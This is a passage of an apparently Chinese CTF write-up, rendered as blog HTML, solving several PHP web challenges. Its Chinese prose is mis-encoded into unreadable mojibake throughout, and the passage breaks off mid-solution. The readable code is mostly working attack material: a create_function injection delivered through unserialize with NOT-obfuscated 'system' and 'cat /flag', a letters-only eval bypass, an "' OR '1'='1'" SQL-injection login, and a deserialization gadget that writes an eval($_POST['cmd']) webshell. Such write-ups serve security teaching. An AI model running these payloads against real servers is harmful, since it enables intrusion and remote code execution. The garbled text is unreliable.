class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;sort&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;sy&#x27;</span>, <span class="string">&#x27;\.\.&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$pattern_a</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;preg_quote&#x27;</span>, <span class="variable">$blocked_a</span>, [<span class="string">&#x27;/&#x27;</span>])) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="variable">$pattern_b</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;preg_quote&#x27;</span>, <span class="variable">$blocked_b</span>, [<span class="string">&#x27;/&#x27;</span>])) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_a</span>, <span class="variable">$a</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_b</span>, <span class="variable">$b</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$p</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>eval($a.$b);</code>æ”¾åœ¨<code>__construct</code> é‡Œæ‘¸ä¸åˆ°ï¼Œè¿™é¢˜å¯ä»¥é€šè¿‡è°ƒç”¨create_functionå‡½æ•°å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</p>
<p>ç”±äºcreate_functionå‡½æ•°çš„ç‰¹æ®Šæ€§ï¼Œå®ƒä¸æ˜¯ç›´æ¥è¿è¡Œä½ çš„ä»£ç ï¼Œè€Œæ˜¯<strong>æŠŠä»£ç åŒ…åœ¨ä¸€ä¸ªå‡½æ•°å®šä¹‰é‡Œ</strong>å†å»è¿è¡Œï¼Œä¾‹å¦‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abcd</span>(<span class="params"></span>) </span>&#123; [ä»£ç ] &#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥payloaadéœ€è¦è¿›è¡Œä»¥<code>} [ä»£ç ] //</code>çš„å½¢å¼æ„é€ ï¼Œé—­åˆå‰é¢å‡½æ•°</p>
<p>é»‘åå• aï¼šè¿‡æ»¤äº†</p>
<p>â€˜evalâ€™, â€˜dlâ€™, â€˜lsâ€™, â€˜pâ€™, â€˜escapeâ€™, â€˜erâ€™, â€˜strâ€™, â€˜catâ€™, â€˜flagâ€™, â€˜fileâ€™, â€˜ayâ€™, â€˜orâ€™, â€˜ftpâ€™, â€˜dictâ€™, â€˜..â€˜, â€˜hâ€™, â€˜wâ€™, â€˜execâ€™, â€˜sâ€™, â€˜openâ€™</p>
<p>é»‘åå• bï¼šè¿‡æ»¤äº†</p>
<p>â€˜findâ€™, â€˜filterâ€™, â€˜câ€™, â€˜paâ€™, â€˜procâ€™, â€˜dirâ€™, â€˜regexpâ€™, â€˜nâ€™, â€˜alterâ€™, â€˜loadâ€™, â€˜grepâ€™, â€˜oâ€™, â€˜fileâ€™, â€˜tâ€™, â€˜wâ€™, â€˜insertâ€™, â€˜sortâ€™, â€˜hâ€™, â€˜syâ€™, â€˜..â€˜, â€˜arrayâ€™, â€˜shâ€™, â€˜touchâ€™, â€˜eâ€™, â€˜phpâ€™, â€˜fâ€™</p>
<p>å¯ä»¥è”åŠ¨æ— å­—æ¯rceçš„çŸ¥è¯†ï¼Œç”¨å–åç»•è¿‡é»‘åå•</p>
<p>ä½†ç”±äºæœ¬é¢˜åœ¨ç»•è¿‡ä¸¤ä¸ªé»‘åå•æ—¶æ˜¯åœ¨phpä»£ç å†…éƒ¨ï¼Œè€Œä¸æ˜¯åœ¨urlæ ï¼Œæ‰€ä»¥ä¸èƒ½é‡‡ç”¨urlç¼–ç ï¼Œå¯ä»¥é‡‡ç”¨åå…­è¿›åˆ¶è½¬æ¢</p>
<p>åœ¨kaliç»ˆç«¯é‡‡ç”¨å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&quot;echo bin2hex(~&#x27;system&#x27;);&quot;</span></span><br><span class="line">//8c868c8b9a92</span><br><span class="line">php -r <span class="string">&quot;echo bin2hex(~&#x27;cat /flag&#x27;);&quot;</span></span><br><span class="line">//9c9e8bdfd099939e98</span><br></pre></td></tr></table></figure>

<p>æ¢æˆ\xxå½¢å¼ï¼Œæ¥ç€å¡«å…¥exp.phpï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;create_function&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;&#125; (~\&quot;\x8c\x86\x8c\x8b\x9a\x92\&quot;)((~\&quot;\x9c\x9e\x8b\xdf\xd0\x99\x93\x9e\x98\&quot;)); //&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>));</span><br><span class="line"><span class="comment">//O%3A4%3A%22FLAG%22%3A2%3A%7Bs%3A7%3A%22%00FLAG%00a%22%3Bs%3A15%3A%22create_function%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A33%3A%22%7D+%28%7E%22%8C%86%8C%8B%9A%92%22%29%28%28%7E%22%9C%9E%8B%DF%D0%99%93%9E%98%22%29%29%3B+%2F%2F%22%3B%7D</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="4-ezrce"><a href="#4-ezrce" class="headerlink" title="4. ezrce"></a>4. ezrce</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z\(\)_;]+$/&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;å¸ˆå‚…ï¼Œä½ æƒ³æ‹¿flagï¼Ÿ&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­£åˆ™ <code>/^[A-Za-z\(\)_;]+$/</code> è¿‡æ»¤äº†å‚æ•°è¾“å…¥ï¼Œåªèƒ½ä½¿ç”¨å¤§å°å†™å­—æ¯ã€å°æ‹¬å· <code>()</code>ã€åˆ†å· <code>;</code> å’Œä¸‹åˆ’çº¿ <code>_</code></p>
<p>å…ˆæµ‹è¯•payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(scandir(getcwd()));</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾ï¼š</p>
<p>array(3) { [0]&#x3D;&gt; string(1) â€œ.â€ [1]&#x3D;&gt; string(2) â€œ..â€ [2]&#x3D;&gt; string(9) â€œindex.phpâ€ }</p>
<p>è¯´æ˜flagä¸åœ¨å½“å‰ç›®å½•ï¼Œå°è¯•æ‰“å°æ ¹ç›®å½•çš„æ–‡ä»¶ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(dirname(dirname(dirname(getcwd())))));</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾ï¼š</p>
<p>array(21) { [0]&#x3D;&gt; string(1) â€œ.â€ [1]&#x3D;&gt; string(2) â€œ..â€ [2]&#x3D;&gt; string(10) â€œ.dockerenvâ€ [3]&#x3D;&gt; string(3) â€œbinâ€ [4]&#x3D;&gt; string(3) â€œdevâ€ [5]&#x3D;&gt; string(3) â€œetcâ€ [6]&#x3D;&gt; string(4) â€œflagâ€ [7]&#x3D;&gt; string(4) â€œhomeâ€ [8]&#x3D;&gt; string(3) â€œlibâ€ [9]&#x3D;&gt; string(5) â€œmediaâ€ [10]&#x3D;&gt; string(3) â€œmntâ€ [11]&#x3D;&gt; string(3) â€œoptâ€ [12]&#x3D;&gt; string(4) â€œprocâ€ [13]&#x3D;&gt; string(4) â€œrootâ€ [14]&#x3D;&gt; string(3) â€œrunâ€ [15]&#x3D;&gt; string(4) â€œsbinâ€ [16]&#x3D;&gt; string(3) â€œsrvâ€ [17]&#x3D;&gt; string(3) â€œsysâ€ [18]&#x3D;&gt; string(3) â€œtmpâ€ [19]&#x3D;&gt; string(3) â€œusrâ€ [20]&#x3D;&gt; string(3) â€œvarâ€ }</p>
<p>å‘ç°flagæ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶å†…å®¹ï¼ˆæ²¡å‡ºæ¥å°±å¤šåˆ·æ–°å‡ æ¬¡ï¼‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(dirname(dirname(dirname(getcwd()))));show_source(array_rand(array_flip(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="5-flagåˆ°åº•åœ¨å“ª"><a href="#5-flagåˆ°åº•åœ¨å“ª" class="headerlink" title="5. flagåˆ°åº•åœ¨å“ª"></a>5. flagåˆ°åº•åœ¨å“ª</h1><p>é“¾æ¥è¿›å»åä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæ‰«ç›®å½•æ‰«å‡º&#x2F;robots.txtå’Œ&#x2F;admin&#x2F;login.php</p>
<p>è®¿é—®&#x2F;admin&#x2F;login.phpå‡ºç°ç™»å½•æ¡†</p>
<p>æ ¹æ®æç¤ºÂ usernameè¾“å…¥adminï¼Œå¯†ç åˆ™å°è¯•ä¸‡èƒ½å¯†ç ï¼Œå†æ ¹æ®é¢˜ç›®æç¤ºè¦ä½¿ç”¨å¤§å†™ï¼Œä½¿ç”¨ä¸‡èƒ½å¯†ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; #</span><br></pre></td></tr></table></figure>

<p>è¿›å»åçš„é¡µé¢ç›´æ¥è¯´æ˜<strong>ä¸Šä¼  PHP Webshell</strong>ï¼Œé‚£å°±ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œç”¨èšå‰‘è¿æ¥åä½¿ç”¨æ’ä»¶æŸ¥çœ‹phpinfoæ‰¾åˆ°flag</p>
<hr>
<h1 id="6-æ¥ç­¾ä¸ªåˆ°å§"><a href="#6-æ¥ç­¾ä¸ªåˆ°å§" class="headerlink" title="6. æ¥ç­¾ä¸ªåˆ°å§"></a>6. æ¥ç­¾ä¸ªåˆ°å§</h1><p>çœ‹é™„ä»¶ï¼Œå…ˆçœ‹index.phpï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./classes.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] === <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&quot;shark&quot;</span>] ?? <span class="string">&#x27;å–µå–µå–µ?&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">str_starts_with</span>(<span class="variable">$s</span>, <span class="string">&quot;blueshark:&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$ss</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>, <span class="title function_ invoke__">strlen</span>(<span class="string">&quot;blueshark:&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$o</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ss</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$p</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO notes (content) VALUES (?)&quot;</span>);</span><br><span class="line">        <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$ss</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;save sucess!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;å–µå–µå–µ?&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$q</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT id, content FROM notes ORDER BY id DESC LIMIT 10&quot;</span>);</span><br><span class="line"><span class="variable">$rows</span> = <span class="variable">$q</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çŸ¥é“ï¼š</p>
<ol>
<li><p>POSTä¼ å…¥sharkå‚æ•°</p>
</li>
<li><p>ä¼šæ£€éªŒå‰ç¼€æ˜¯å¦æ˜¯blueshark:</p>
</li>
<li><p>@unserialize($ss)ä¼šè§¦å‘ååºåˆ—åŒ–ï¼ŒåŒæ—¶@æŠ‘åˆ¶æŠ¥é”™</p>
</li>
<li><p>ä½¿ç”¨äº† <strong>PDO é¢„å¤„ç†</strong>ï¼Œæœç»äº† SQL æ³¨å…¥æ¼æ´</p>
</li>
</ol>
<p>å†çœ‹classes.phpï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileLogger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logfile</span> = <span class="string">&quot;/tmp/notehub.log&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>=<span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$f</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logfile = <span class="variable">$f</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content .= <span class="variable">$msg</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;logfile, <span class="variable">$this</span>-&gt;content, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;content) &#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;logfile, <span class="variable">$this</span>-&gt;content, FILE_APPEND);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShitMountant</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;url = <span class="variable">$url</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="keyword">new</span> <span class="title class_">FileLogger</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;logger) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;fetched ==&gt; &quot;</span> . <span class="variable">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æŠ“ä½<strong>å…³é”®å‡½æ•°file_put_contents</strong>ï¼Œè¿™é‡Œå°±æ˜¯ä¼ å…¥shellå¹¶è¯»å–flagçš„å…³é”®</p>
<p>å†çœ‹config.phpï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_FILE&#x27;</span>, <span class="string">&#x27;/tmp/notehub.db&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(DB_FILE)) &#123;</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;sqlite:&#x27;</span> . DB_FILE);</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;CREATE TABLE notes (id INTEGER PRIMARY KEY AUTOINCREMENT, content TEXT)&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;sqlite:&#x27;</span> . DB_FILE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åªæ˜¯è¯´æ˜è¿æ¥åˆ°æˆ–è€…è‡ªåŠ¨åˆå§‹åŒ–ä¸€ä¸ª SQLite æ•°æ®åº“ï¼Œæ²¡æœ‰ä»€ä¹ˆå¤ªå¤§ä½œç”¨</p>
<p>æœ€åçœ‹api.phpï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./classes.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>] ?? <span class="string">&#x27;å–µå–µå–µ?&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT content FROM notes WHERE id = ?&quot;</span>);</span><br><span class="line"><span class="variable">$s</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$id</span>]);</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$s</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="variable">$row</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å–µå–µå–µ?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cfg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$row</span>[<span class="string">&quot;content&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cfg</span> <span class="keyword">instanceof</span> ShitMountant) &#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$cfg</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ok!&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$r</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å–µå–µå–µ?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çŸ¥é“ï¼š</p>
<ol>
<li><p>ä¼ å…¥GETå‚æ•°id</p>
</li>
<li><p>ä½¿ç”¨äº† <strong>PDO é¢„å¤„ç†</strong>ï¼Œæœç»äº† SQL æ³¨å…¥æ¼æ´</p>
</li>
<li><p>å­˜åœ¨ echo nl2br(htmlspecialchars($r));å¯ä»¥æ‰“å°å‡ºå›æ˜¾å†…å®¹ï¼Œä½†é‡‡ç”¨å†™å…¥shellä¸éœ€è¦ç”¨åˆ°</p>
</li>
</ol>
<p>æ”»å‡»é¡ºåºå·®ä¸å¤šæ‹æ¸…äº†ï¼š</p>
<ol>
<li><p>é¦–å…ˆåˆ©ç”¨classes.phpä¸­çš„ç±»ç¼–å†™è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileLogger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logfile</span> = <span class="string">&quot;shell.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;&lt;?php @eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileLogger</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

